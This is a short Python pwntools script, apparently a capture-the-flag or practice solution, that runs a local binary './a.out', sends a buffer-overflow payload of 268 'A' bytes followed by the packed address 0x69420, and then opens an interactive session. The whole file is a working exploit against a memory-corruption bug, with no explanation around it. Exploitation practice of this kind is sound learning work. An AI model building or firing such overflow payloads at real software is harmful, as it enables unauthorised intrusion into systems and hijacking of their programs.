# coding: utf-8
from pwn import *
p = process("./a.out")
payload = b"A"*268 + p32(0x69420)
p.recv()
p.sendline(payload)
p.interactive()
